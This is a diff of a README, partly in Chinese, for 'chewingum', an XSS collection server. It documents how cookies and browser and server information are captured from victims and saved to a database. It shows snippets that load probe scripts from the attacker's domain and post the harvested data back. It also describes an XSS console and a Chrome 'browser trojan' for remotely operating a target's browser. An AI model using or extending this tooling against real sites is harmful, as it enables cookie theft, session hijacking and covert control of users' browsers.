@@ -2,7 +2,7 @@
 
 Name
 ----
-**chewingum - individual XSS Server**
+***chewingum - individual XSS Server***
 
 Startup
 -------
@@ -23,16 +23,18 @@ Dependencies
 Reference
 ---------
 * (Gum.js) - [xss.js](http://zone.wooyun.org/content/2113)
-           - [BeEF](http://beefproject.com/)
+* (get_info.js) - [BeEF](http://beefproject.com/)
+* (wec_cssbug.html) - [CSS3事件的消息回调BUG](http://www.web-tinker.com/article/20339.html)
+* (get_networkip.js) - [Network IP Address via ipcalf.com](http://net.ipcalf.com/)
 
 Helptext
 --------
 
-*1.login*
+**1.Login**
 
 采用filekey验证, 上传filekey或输入URL便可登录.
 
-*2.server*
+**2.Server**
 
 server处代码会直接在项目触发时执行,  
 最终会将变量serverinfo和变量browserinfo保存至数据库,  
@@ -50,7 +52,7 @@ server处代码会直接在项目触发时执行,
     	'cookie':b64encode(str(request.forms.get('cookie')))
 	}
 
-*3.server code keyword*
+**3.Server code keyword**
 
 iferror  
 对变量iferror赋值, 会触发对应错误.  
@@ -70,29 +72,29 @@ gum.backinfo
 
     gum.backinfo = {};
 
-*4.project name and object name*
+**4.Project name and Object name**
 
 project 的项目名需是xss触发处的url或是domain.  
 $default是默认项目, xss触发时若未发现对应项目则按照此配置进行.
 
 	object 的项目名可随意更改.
 
-*5.plugins*
+**5.Plugins**
 
 可以这样导入server扩展,
 
-	with open('./plus/get_info.py') as files: exec files.read()
+	with open('./static/serv/get_info.py') as files: exec files.read()
 
 也可以这样
 
-    from plus.email_remind import send_mail
+    from static.serv.email_remind import send_mail
     send_mail(gum_emailremind)
 
 >    具体看扩展的写法
 
 可以这样导入browser插件,
 
-	gum.script('http://' + gum.domain + '/static/plus/tool_boomerang.js')
+	gum.script('http://' + gum.domain + '/static/brows/tool_boomerang.js')
 
 
 这样给browser插件传参,
@@ -113,7 +115,7 @@ $default是默认项目, xss触发时若未发现对应项目则按照此配置�
 		'endate':'2013-12-12 15:17:00'
 	}
 
-*6.set code*
+**6.Set code**
 
 这样发送browser info,
 
@@ -132,30 +134,30 @@ $default是默认项目, xss触发时若未发现对应项目则按照此配置�
 
 >	不推荐使用多次接收，默认已关闭。
 
-*7.other*
+**7.Easy example**
 
 使用基本探针:
 
 server:
 
-    with open('./plus/get_info.py') as files: exec files.read()
+    with open('./static/serv/get_info.py') as files: exec files.read()
 
 browser:
 
-    gum.script('http://' + gum.domain + '/static/plus/get_info.js', function(){
+    gum.script('http://' + gum.domain + '/static/brows/get_info.js', function(){
         gum.post('http://' + gum.domain + '/ing', gum.backinfo);
         gum.backinfo = {};
     })
 
-*8.console*
+**8.Console**
 
 javascript文件在
 
-    ./static/plus/onexsshell.js
+    ./static/brows/onexsshell.js
 
 >    尚在测试阶段。
 
-*9.browser trojan*
+**9.Browser trojan**
 
 chrome  
 修改./trojan/chrome/gum.js中的{{domain}}为你的chewingum的域名及端口  
@@ -163,3 +165,14 @@ chrome
 安装在目标的浏览器后，使用console即可操作目标浏览器。  
 
 >    尚在测试阶段
+
+**10.Plugins header specification**
+
+    Author[Reference] - Date
+        Name - Dependencies
+                - Synopsis
+            Example
+                and
+            Dependencies Plus
+
+>   好吧我知道不会有人帮我写插件的...
